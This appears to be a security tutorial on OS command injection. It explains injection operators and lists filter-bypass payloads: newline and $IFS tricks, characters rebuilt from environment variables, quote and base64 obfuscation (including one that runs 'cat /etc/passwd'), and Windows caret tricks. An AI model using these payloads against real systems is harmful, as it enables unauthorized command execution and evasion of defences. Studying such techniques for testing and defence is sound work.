**OS Command Injection** occurs when user input is directly passed to a system command without proper sanitization. This allows an attacker to execute arbitrary commands on the underlying operating system.

A typical vulnerable pattern looks like:

```bash
ping -c 1 USER_INPUT
```

If `USER_INPUT` is not sanitized, we can append additional commands.

---

## Command Injection Detection

To detect this vulnerability, we try to modify the expected input and observe changes in the output.

Example:

```bash
127.0.0.1; whoami
```

If the response includes the result of `whoami`, the application is vulnerable.

---

## Injection Operators

We use operators to append commands:

| Operator   | Character | URL Encoded | Behavior                                |
| ---------- | --------- | ----------- | --------------------------------------- |
| Semicolon  | ;         | `%3b`       | Executes both commands                  |
| AND        | &&        | `%26%26`    | Executes second if first succeeds       |
| OR         | \|\|      | `%7c%7c`    | Executes second if first fails          |
| Pipe       | \|        | `%7c`       | Sends output of first to second         |
| Background | &         | `%26`       | Runs both (parallel, output may vary)   |
| Newline    | \n        | `%0a`       | Executes both (command separator)       |
| Subshell   | $()       | `%24%28%29` | Executes command and substitutes output |

If common operators are blocked, newline is often still allowed:

```bash
127.0.0.1%0aid
```

---

## Bypassing Space Filters

Spaces are commonly filtered.  Here are some alternatives:

### Using Tabs

```bash
127.0.0.1%0a%09id
```

### Using $IFS

```bash
127.0.0.1%0a${IFS}id
```

### Using Brace Expansion

```bash
127.0.0.1%0a{ls,-la}
```

---

## Bypassing Filtered Characters

Some characters like `/`, `;`, or spaces may be blocked by filters. However, we can **reconstruct them dynamically** using environment variables or shell features.

### Using Environment Variables
This extracts the first character of `$PATH`, which is usually `/`.
```bash
${PATH:0:1}
```

This works because environment variables contain predictable values, and shells allow substring extraction.

Example payload:

```bash
127.0.0.1%0a{ls,${PATH:0:1}home}
```

Here:

- `${PATH:0:1}` → `/`
    
- `{ls,/home}` → expands into `ls /home` without using spaces or `/` directly


Also, we can extract `;` from environment variables that contain it:
```bash
${LS_COLORS:10:1}
```

Example payload:

```bash
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
```
Here:

- `${LS_COLORS:10:1}` → `;`
    
- `${IFS}` → space
    
- Final command → `127.0.0.1; whoami`

---

## Bypassing Command Blacklists

If commands like `whoami` are blocked, filters usually rely on **exact string matching**. We can bypass them by slightly modifying the command while keeping its execution intact.

### Using Quotes

```bash
w'h'o'am'i
```

Bash ignores quotes inside commands, so this is still interpreted as `whoami`.

### Using Backslashes

```bash
w\ho\am\i
```

Backslashes escape characters but do not change the final command.


### Using $@

```bash
who$@ami
```

`$@` expands to positional parameters (usually empty), so the command remains valid.

---

## Advanced Obfuscation

When simple obfuscation is not enough (e.g., WAFs), we can transform the command before execution.

### Case Manipulation

```bash
WhOaMi
```

On Linux, this normally fails (case-sensitive), so we convert it dynamically:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

This transforms the string at runtime into `whoami`.

### Reversed Commands
The command is reversed at runtime, avoiding blacklist detection.
```bash
echo 'whoami' | rev
```

Output:

```
imaohw
```

Execute:

```bash
$(rev<<<'imaohw')
```


### Encoded Commands (Base64)
This hides the command from filters and reconstructs it only during execution.

Encode:

```bash
echo -n 'cat /etc/passwd' | base64
```

Execute:

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```



---

## Windows Techniques

Windows shells also allow similar obfuscation techniques.

### Obfuscation

```cmd
who^ami
```

The `^` character is ignored by CMD, so the command executes normally.

### Environment Variables

```cmd
%HOMEPATH:~6,-11%
```

Extracts a substring from a variable to produce characters like `\`.

PowerShell equivalent:

```powershell
$env:HOMEPATH[0]
```

This accesses a specific character directly from the variable.
